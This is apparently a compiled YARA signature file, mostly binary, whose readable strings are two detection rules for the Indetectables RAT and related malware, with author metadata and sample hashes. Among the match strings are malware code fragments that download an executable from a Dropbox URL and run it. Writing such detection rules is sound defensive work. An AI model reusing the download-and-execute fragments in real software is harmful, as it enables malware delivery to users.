YARA�          �       �   6         6      �  �               ~  �        �          �         �         �      �  ;                             
         ��������                                  ��������         0             ��������������������������������������������         &                     �      �                     �      �                                              W     \                    g  ��������                 r     x                    �     �                                                                       �      �                     �      �                     W     \                    g  ��������                 r     V                    �     �                �      �ں�ں��          K  ��������           G  �     �ں�ں��          [  ��������           W       �ں�ں��          r  ��������           n  �     �ں�ں��    	      �  ��������           �  �     �ں�ں��          �  ��������           �  �     �ں�ں��          �  ��������           �  �     �ں�ں��          �  ��������           �  	     �ں�ں��          �  ��������           �  �     �ں�ں��          �  ��������           �  �  	   �ں�ں��          �  ��������           �    
   �ں�ں��         �  ��������           �  �     �ں�ں��   X      �  ��������           �  �     �ں�ں��   K      V  ��������           G  �     �ں�ں��   ]      �  ��������           W  �     �ں�ں��   #         ��������           n  �     �ں�ں��   6      $  ��������           �       �ں�ں��   "      [  ��������           �      ��������������������default Indetectables_RAT description Detects Indetectables RAT based on strings found in research by Paul Rascagneres & Ronan Mouchoux license Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE author Florian Roth (Nextron Systems) reference http://www.sekoia.fr/blog/when-a-brazilian-string-smells-bad/ date 2015-10-01 super_rule hash1 081905074c19d5e32fd41a24b4c512d8fd9d2c3a8b7382009e3ab920728c7105 hash2 66306c2a55a3c17b350afaba76db7e91bfc835c0e90a42aa4cf59e4179b80229 hash3 1fa810018f6dd169e46a62a4f77ae076f93a853bfc33c7cf96266772535f6801 $s1 Coded By M3 $s2 Stub Undetector M3 $s3 www.webmenegatti.com.br $s4 M3n3gatt1 $s5 TheMisterFUD $s6 KillZoneKillZoneKill $s7 [[__M3_F_U_D_M3__]]$ $s8 M3_F_U_D_M3 $s9 M3n3gatt1hack3r $s10 BergSilva_Malware Detects a malware from the same author as the Indetectables RAT 00e175cbad629ee118d01c49c11f3d8b8840350d2dd6d16bd81e47ae926f641e 6b4cbbee296e4a0e867302f783d25d276b888b1bf1dcab9170e205d276c22cfc $x1 C:\Users\Berg Silva\Desktop\ $x2 URLDownloadToFileA 0, "https://dl.dropbox.com/u/105015858/nome.exe", "c:\nome.exe", 0, 0  Process.Start (Path.GetTempPath() & "name" & ".exe") 'start server baixado FileDelete(@TempDir & "\nome.exe") ;Deleta o Arquivo para que possa ser executado normalmente  Lib "\WINDOWS\system32\UsEr32.dLl" $Directory = @TempDir & "\nome.exe" ;Define a variavel https://dl.dropbox.com/u/105015858 �       ? �@MZd/   %A  N f/l   ?B          8      p      �      �           P     �     �     �                  |      ? �@MZd/c   ?B   0     h          1?   ?B   �     �          H     �                 �        *      ,      .      2              6      :      <      >      @                                                      ~  #     �      �      �      �              /  0      �   0  4     �      �      �      �      �          48          D&                     4H  2T          N       .  4j          T"  U                      ;v                      4�              [4              `0              m  n              ]B          u
          `\      G�      `f  fL          iP              ib                      pX  oZ  ^�              pz              ur      xn                  o�                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
              	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              ������������������������          8   ������������������������          p   ������������������������
          �   ������������������������          �   ������������������������            ������������������������          P  ������������������������          �  ������������������������          �  ����������������
   x             �  ������������������������          0  ������������������������          h  ������������������������b          �  ������������������������@          �  ������������������������            ������������������������,          H  ������������������������4          �  ����������������
   �  4                                                    (                          (      @      H      `      h      �      �      �      �      �      �      �      �                 0                
       
      
      
         h      P      X   
   (   
   0   
   8   
   @      �      �      �   
   P   
   X   
   `   
   h      �      �      �   
   x   
   �   
   �   
   �           �         
   �   
   �   
   �   
   �      H     0     8  
   �   
   �   
   �   
   �      �     h     p  
   �   
   �   
      
        �     �     �  
     
      
   (  
   0     �     �     �  
   @  
   H  
   P  
   X     (            
   h  
   p  
   x  
   �     &      /      8      A      J      S      \      e      n      w      8      @      P      H      X            (     @     H     `     h     �     �     �     �     �     �     �     �     `     H     P  
   �  
   �  
   �  
   �     �     �     �  
   �  
   �  
   �  
   �     �     �     �  
   �  
   �  
   �  
   �          �     �  
     
     
     
         @     (     0  
   0  
   8  
   @  
   H     x     `     h  
   X  
   `  
   h  
   p     �     �     �  
   �  
   �  
   �  
   �     �      �      �      �      �      �      �   